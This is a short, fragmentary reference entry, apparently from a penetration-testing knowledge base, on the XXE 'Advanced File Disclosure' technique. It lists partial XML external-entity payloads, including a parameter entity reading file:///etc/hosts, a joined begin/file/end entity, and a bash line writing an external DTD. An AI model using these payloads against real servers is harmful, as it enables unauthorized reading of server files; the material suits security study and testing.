---
technique: "Advanced File Disclosure"
family: "ssrf-xxe-file"
severity_hint: "critical"
tags: []
source: "_raw/Web attacks/Web Attacks/XXE/Advanced File Disclosure.md"
source_sha256: "a154d9da8fc50a486dbe1ef9f9fd4dd7112c99cdcb32b050d50e38059a07245d"
curator_version: 2
...
- `xml: <!DOCTYPE email [`
- `xml: <!ENTITY joined "%begin;%file;%end;">`
- `bash: $ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd`
- `xml: <!DOCTYPE email [`
- `xml: <!ENTITY % file SYSTEM "file:///etc/hosts">`
- `xml: <!DOCTYPE email [`
...
## Source
Original note: `_raw/Web attacks/Web Attacks/XXE/Advanced File Disclosure.md`
